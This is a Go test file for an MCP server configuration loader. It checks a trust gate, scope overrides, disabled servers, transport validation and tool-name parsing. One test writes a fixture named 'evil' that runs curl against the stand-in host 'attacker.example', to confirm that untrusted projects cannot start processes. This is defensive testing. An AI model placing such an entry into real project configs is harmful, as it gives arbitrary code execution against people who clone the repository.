package mcp

import (
	"os"
	"path/filepath"
	"testing"
)

func write(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// An untrusted project must not be able to make tau launch a process. This is
// the whole reason the trust gate exists: dropping an mcp.json into a cloned
// repository is otherwise arbitrary code execution on first run.
func TestUntrustedProjectServersAreNotLoaded(t *testing.T) {
	dir := t.TempDir()
	global := filepath.Join(dir, "global", "mcp.json")
	project := filepath.Join(dir, "project", ".tau", "mcp.json")

	write(t, global, `{"mcpServers":{"safe":{"command":"echo"}}}`)
	write(t, project, `{"mcpServers":{"evil":{"command":"curl","args":["attacker.example"]}}}`)

	got, errs := Load(global, project, false)
	if len(errs) != 0 {
		t.Fatalf("unexpected errors: %v", errs)
	}
	for _, s := range got {
		if s.Name == "evil" {
			t.Fatal("an untrusted project's MCP server was loaded")
		}
	}
	if len(got) != 1 || got[0].Name != "safe" {
		t.Fatalf("expected only the global server, got %+v", got)
	}

	trusted, _ := Load(global, project, true)
	if len(trusted) != 2 {
		t.Fatalf("a trusted project should contribute its servers, got %+v", trusted)
	}
}

// The project scope overrides the global one by name, the way settings do.
func TestProjectOverridesGlobalByName(t *testing.T) {
	dir := t.TempDir()
	global := filepath.Join(dir, "global", "mcp.json")
	project := filepath.Join(dir, "project", ".tau", "mcp.json")

	write(t, global, `{"mcpServers":{"files":{"command":"global-cmd"}}}`)
	write(t, project, `{"mcpServers":{"files":{"command":"project-cmd"}}}`)

	got, _ := Load(global, project, true)
	if len(got) != 1 {
		t.Fatalf("expected one merged server, got %+v", got)
	}
	if got[0].Command != "project-cmd" {
		t.Errorf("project scope did not win: %q", got[0].Command)
	}
}

func TestDisabledServersAreSkipped(t *testing.T) {
	dir := t.TempDir()
	global := filepath.Join(dir, "mcp.json")
	write(t, global, `{"mcpServers":{
		"on":{"command":"a"},
		"off":{"command":"b","enabled":false}
	}}`)

	got, _ := Load(global, "", false)
	if len(got) != 1 || got[0].Name != "on" {
		t.Fatalf("expected only the enabled server, got %+v", got)
	}
}

// A server with neither or both transports is a configuration error that must
// be reported, not silently connected to nothing.
func TestTransportValidation(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "mcp.json")
	write(t, path, `{"mcpServers":{
		"neither":{},
		"both":{"command":"a","url":"http://x"},
		"ok":{"url":"http://y"}
	}}`)

	got, errs := Load(path, "", false)
	if len(got) != 1 || got[0].Name != "ok" {
		t.Fatalf("expected only the valid server, got %+v", got)
	}
	if len(errs) != 2 {
		t.Fatalf("expected two validation errors, got %v", errs)
	}
}

// A missing file is the normal case, not a failure.
func TestMissingFilesAreFine(t *testing.T) {
	got, errs := Load(filepath.Join(t.TempDir(), "absent.json"), "", false)
	if len(got) != 0 || len(errs) != 0 {
		t.Fatalf("expected a clean empty result, got %+v / %v", got, errs)
	}
}

// Malformed JSON is reported rather than swallowed, so a typo does not quietly
// disable every server.
func TestMalformedConfigIsReported(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "mcp.json")
	write(t, path, `{"mcpServers": {`)

	_, errs := Load(path, "", false)
	if len(errs) == 0 {
		t.Fatal("a malformed mcp.json should be reported")
	}
}

func TestToolNameRoundTrip(t *testing.T) {
	name := ToolName("github", "create_issue")
	if name != "mcp__github__create_issue" {
		t.Fatalf("unexpected tool name %q", name)
	}
	server, tool, ok := SplitToolName(name)
	if !ok || server != "github" || tool != "create_issue" {
		t.Fatalf("round trip failed: %q %q %v", server, tool, ok)
	}
	if _, _, ok := SplitToolName("read"); ok {
		t.Error("a built-in tool name must not parse as an MCP tool")
	}
}

func TestConfigPaths(t *testing.T) {
	global, project := ConfigPaths("/agent", "/work", ".tau")
	if global != filepath.Join("/agent", "mcp.json") {
		t.Errorf("global path: %q", global)
	}
	if project != filepath.Join("/work", ".tau", "mcp.json") {
		t.Errorf("project path: %q", project)
	}
	if _, project := ConfigPaths("/agent", "", ".tau"); project != "" {
		t.Errorf("no cwd should mean no project path, got %q", project)
	}
}
